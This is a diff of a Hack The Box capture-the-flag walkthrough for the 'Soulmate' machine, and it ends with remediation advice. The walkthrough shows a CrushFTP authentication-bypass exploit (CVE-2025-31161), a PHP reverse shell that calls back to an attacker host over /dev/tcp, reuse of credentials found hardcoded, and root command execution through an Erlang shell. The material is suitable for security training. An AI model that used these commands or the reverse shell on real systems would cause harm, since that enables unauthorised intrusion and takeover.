@@ -2,50 +2,66 @@
 
 ![Soulmate](../images/Soulmate.png)
 
-## Machine Info
+**Machine:** Soulmate  
+**Difficulty:** Easy  
+**OS:** Linux  
+**IP:** 10.10.11.86  
+**Release Date:** 2025-10-30  
+**Tags:** CrushFTP, Authentication Bypass, CVE-2025-31161, File Upload, Erlang SSH, Privilege Escalation
 
-- Difficulty: Easy  
-- OS: Linux  
-- IP: 10.10.11.86  
-- Release date: 2025-10-30  
-- Points: 20
+---
+
+## Table of Contents
+
+1. [Summary](#summary)
+2. [Reconnaissance](#reconnaissance)
+3. [Initial Access](#initial-access)
+4. [Privilege Escalation to User](#privilege-escalation-to-user)
+5. [Privilege Escalation to Root](#privilege-escalation-to-root)
+6. [Summary of Exploits](#summary-of-exploits)
+7. [Remediation](#remediation)
+8. [Tools](#tools)
 
 ---
 
 ## Summary
 
-Soulmate is an Easy Linux box.  
-It exposes a CrushFTP web interface vulnerable to an authentication bypass, CVE-2025-31161.  
-I created an admin user, used the web UI to upload a PHP reverse shell, and obtained a `www-data` shell.  
-I found hardcoded SSH credentials in an Erlang startup script.  
-I used those creds to access an Erlang-based SSH service running as root, and executed commands via the Erlang shell.  
-Root was obtained.
+Soulmate is an Easy Linux box that exposes a CrushFTP web interface vulnerable to an authentication bypass (CVE-2025-31161). After creating an admin user through the vulnerability, I uploaded a PHP reverse shell via the web UI and obtained a `www-data` shell. I discovered hardcoded SSH credentials in an Erlang startup script, used them to access an Erlang-based SSH service running as root, and executed commands via the Erlang shell to achieve root access.
+
+**Attack Path:**  
+Web enumeration → CrushFTP auth bypass → File upload (PHP shell) → Erlang service enumeration → Hardcoded credentials → Erlang SSH (root) → Root flag
 
 ---
 
-## Recon
+## Reconnaissance
 
-Run a quick nmap scan:
+### Port Scanning
+
+Initial nmap scan to discover open services:
 
 ```bash
 nmap -sC -sV -oN nmap_initial.txt 10.10.11.86
-````
+```
 
-Key results:
+**Key Results:**
 
 ```
 22/tcp open  ssh     OpenSSH 8.9p1
 80/tcp open  http    nginx 1.18.0
 ```
 
-Add host entries:
+### Hostname Configuration
+
+Added hostname entries for easier navigation:
 
 ```bash
 echo "10.10.11.86 soulmate.htb" | sudo tee -a /etc/hosts
 echo "10.10.11.86 ftp.soulmate.htb" | sudo tee -a /etc/hosts
 ```
 
-Discover virtual hosts with ffuf:
+### Virtual Host Discovery
+
+Enumerated virtual hosts using ffuf:
 
 ```bash
 ffuf -u http://10.10.11.86/ -H 'Host: FUZZ.soulmate.htb' \
@@ -53,35 +69,48 @@ ffuf -u http://10.10.11.86/ -H 'Host: FUZZ.soulmate.htb' \
   -ac -t 50
 ```
 
-Found `ftp.soulmate.htb`.
-`ftp.soulmate.htb` runs CrushFTP, version 11.W.657.
+**Discovery:**
+- Found `ftp.soulmate.htb` virtual host
+- Running CrushFTP version 11.W.657
 
 ---
 
 ## Initial Access
 
-Search for CrushFTP exploits.
-CVE-2025-31161 is an authentication bypass that allows creating admin users.
+### CVE-2025-31161: CrushFTP Authentication Bypass
 
-Exploit with the public script:
+CVE-2025-31161 is an authentication bypass vulnerability that allows creating admin users without authentication.
+
+**Exploitation Steps:**
+
+1. Search for available exploit:
 
 ```bash
 searchsploit -m 52295
+```
+
+2. Check if target is vulnerable:
+
+```bash
 python3 52295.py --target ftp.soulmate.htb --port 80 --check
+```
+
+3. Create admin user:
+
+```bash
 python3 52295.py --target ftp.soulmate.htb --port 80 --exploit \
   --new-user hackerman --password 'Password123!'
 ```
 
-Log in to CrushFTP web UI:
+**Access Credentials:**
+- URL: `http://ftp.soulmate.htb/WebInterface/login.html`
+- Username: `hackerman`
+- Password: `Password123!`
 
-* URL: `http://ftp.soulmate.htb/WebInterface/login.html`
-* User: `hackerman`
-* Pass: `Password123!`
+### Web Shell Upload
 
-Use the file browser to inspect the filesystem.
-Locate `/webProd/`, the web app root.
-
-Create a PHP reverse shell:
+1. Located web root directory `/webProd/` via CrushFTP file browser
+2. Created PHP reverse shell:
 
 ```bash
 cat > revshell.php << 'EOF'
@@ -91,59 +120,64 @@ exec("/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.114/4444 0>&1'");
 EOF
 ```
 
-Upload `revshell.php` via CrushFTP to `/webProd/`.
+3. Uploaded `revshell.php` to `/webProd/` via CrushFTP interface
 
-Start a listener:
+4. Started netcat listener:
 
 ```bash
 nc -lvnp 4444
 ```
 
-Trigger the shell:
+5. Triggered the shell:
 
 ```bash
 curl http://soulmate.htb/revshell.php
 ```
 
-Stabilize the shell:
+6. Stabilized the shell:
 
 ```bash
 python3 -c 'import pty; pty.spawn("/bin/bash")'
 export TERM=xterm
 ```
 
-You now hold a `www-data` shell.
+✅ **Initial shell obtained as `www-data`**
 
 ---
 
 ## Privilege Escalation to User
 
-Enumerate services and files.
+### Service Enumeration
 
-Check listening ports:
+Checked listening ports for internal services:
 
 ```bash
 netstat -tulnp
 ```
 
-Notable ports:
+**Key Findings:**
+- `127.0.0.1:2222` — Internal SSH service (Erlang-based)
+- `0.0.0.0:4369` — EPMD (Erlang Port Mapper Daemon)
 
-* `127.0.0.1:2222` LISTEN (internal SSH service)
-* `0.0.0.0:4369` LISTEN (EPMD, Erlang Port Mapper Daemon)
+### Erlang Service Discovery
 
-Search for Erlang service files:
+Located Erlang service files:
 
 ```bash
 find / -name "*erlang*" -type f 2>/dev/null
 cat /etc/systemd/system/erlang_ssh.service
 ```
 
-Service runs as `root`:
+**Service Configuration:**
 
 ```
 ExecStart=/usr/local/bin/escript /usr/local/lib/erlang_login/start.escript
 User=root
 ```
+
+The Erlang SSH service runs as root, making it a high-value target.
+
+### Hardcoded Credentials Discovery
 
 Read the startup script:
 
@@ -151,101 +185,149 @@ Read the startup script:
 cat /usr/local/lib/erlang_login/start.escript
 ```
 
-Found hardcoded credentials:
+**Found hardcoded credentials:**
 
 ```erlang
 {user_passwords, [{"ben", "HouseH0ldings998"}]}
 ```
 
-SSH to the machine as `ben`:
+### SSH Access as User
+
+Authenticated via SSH using discovered credentials:
 
 ```bash
 ssh ben@10.10.11.86
-# password: HouseH0ldings998
+# Password: HouseH0ldings998
 ```
 
-Read user flag:
+**User Flag:**
 
 ```bash
 cat /home/ben/user.txt
 # HTB{redacted}
 ```
 
+✅ **User flag captured**
+
 ---
 
 ## Privilege Escalation to Root
 
-Check sudo privileges:
+### Sudo Enumeration
+
+Checked sudo privileges:
 
 ```bash
 sudo -l
-# no sudo for ben
 ```
 
-Connect to the Erlang SSH service on localhost as ben:
+No sudo privileges available for user `ben`.
+
+### Erlang SSH Exploitation
+
+Connected to the Erlang SSH service running on localhost:
 
 ```bash
 ssh ben@127.0.0.1 -p 2222
-# password: HouseH0ldings998
+# Password: HouseH0ldings998
 ```
 
-You reach an Erlang shell:
+This provided access to an Erlang shell:
 
 ```
 Eshell V15.2.5
 (ssh_runner@soulmate)1>
 ```
 
-Erlang's `os:cmd/1` runs commands as the Erlang process user.
-Verify root:
+### Root Command Execution
+
+Erlang's `os:cmd/1` function executes commands as the Erlang process user (root):
+
+**Verify root access:**
 
 ```erlang
 os:cmd("whoami").
 % "root\n"
 ```
 
-Read root flag:
+**Capture root flag:**
 
 ```erlang
 os:cmd("cat /root/root.txt").
 % "HTB{redacted}\n"
 ```
 
+✅ **Root flag captured**
+
 ---
 
-## Findings
+## Summary of Exploits
 
-* CVE-2025-31161, CrushFTP auth bypass.
-* Web upload allowed PHP shells.
-* Hardcoded credentials in a startup script.
-* Erlang SSH service ran as root and allowed shell commands.
+| Stage | Vulnerability | Technique | Result |
+|-------|---------------|-----------|--------|
+| 1 | CrushFTP Auth Bypass | CVE-2025-31161 | Admin user creation |
+| 2 | File Upload | PHP reverse shell | www-data shell |
+| 3 | Hardcoded Credentials | Erlang startup script | SSH access as ben |
+| 4 | Privilege Escalation | Erlang SSH (root) | Root access |
 
 ---
 
 ## Remediation
 
-* Patch CrushFTP to a fixed version.
-* Block web uploads of executable code. Validate content and store uploads outside web root.
-* Remove hardcoded credentials. Use a secrets store with restricted access.
-* Run services with least privilege. Avoid running network-exposed services as root.
-* Restrict internal services. Do not expose sensitive internal interfaces to web processes.
+### Critical Security Issues
+
+1. **CVE-2025-31161 (CrushFTP Authentication Bypass)**
+   - Apply vendor patches immediately
+   - Update CrushFTP to a fixed version
+   - Monitor for unauthorized user creation
+
+2. **File Upload Vulnerabilities**
+   - Implement strict file upload validation
+   - Block executable file types (PHP, JSP, etc.)
+   - Store uploads outside web root
+   - Use content-type and magic byte validation
+
+3. **Hardcoded Credentials**
+   - Remove hardcoded credentials from code
+   - Implement secure credential storage (environment variables, secrets management)
+   - Rotate all discovered credentials
+   - Use least privilege service accounts
+
+4. **Service Configuration**
+   - Run services with least privilege (avoid root)
+   - Restrict network exposure of sensitive services
+   - Implement proper authentication and authorization
+   - Use configuration management tools for secure deployment
+
+### Best Practices
+
+- Regular security audits of application code
+- Automated dependency scanning (SAST/DAST)
+- Network segmentation to limit lateral movement
+- Logging and monitoring for suspicious activities
+- Regular penetration testing and vulnerability assessments
 
 ---
 
 ## Tools
 
-* nmap
-* ffuf
-* searchsploit
-* netcat
-* ssh
-* python3
+| Tool | Purpose |
+|------|---------|
+| `nmap` | Port scanning and service enumeration |
+| `ffuf` | Virtual host enumeration |
+| `searchsploit` | Exploit database search |
+| `netcat` | Reverse shell listener |
+| `curl` | HTTP requests and shell triggering |
+| `ssh` | Remote access and service enumeration |
+| `python3` | Shell stabilization |
 
 ---
 
-## Notes
+**Author:** Erviano Florentino Susanto  
+**Platform:** Hack The Box  
+**Date:** 2025-10-30  
+**Flags:** User `HTB{redacted}`, Root `HTB{redacted}`
 
-* User flag: `HTB{redacted}`
-* Root flag: `HTB{redacted}`
-* Owned: 2025-10-30
-* Platform: Hack The Box
+---
+
+*This writeup is for educational purposes only. Always obtain proper authorization before testing security vulnerabilities.*
